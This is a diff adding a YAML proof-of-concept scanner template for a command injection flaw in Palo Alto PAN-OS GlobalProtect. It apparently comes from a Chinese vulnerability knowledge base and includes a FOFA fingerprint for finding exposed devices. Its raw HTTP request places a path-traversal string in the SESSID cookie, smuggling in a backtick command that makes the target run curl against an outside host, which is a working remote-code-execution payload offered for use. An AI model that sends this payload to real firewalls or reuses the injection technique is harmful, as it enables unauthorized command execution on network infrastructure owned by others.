@@ -1,0 +1,43 @@
+id: poc-mehaazeexu61lgsm
+info:
+  name: Palo Alto Networks PAN-OS GlobalProtect 命令注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mehaazeexu61lgsm'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mehaazeexu61lgsm
+    fofa: icon_hash="-631559155"
+http:
+- raw:
+  - 'GET /global-protect/login.esp HTTP/1.1
+
+
+    Connection: close
+
+
+    Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/hellothere226`curl${IFS}www.baidu.com`;
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
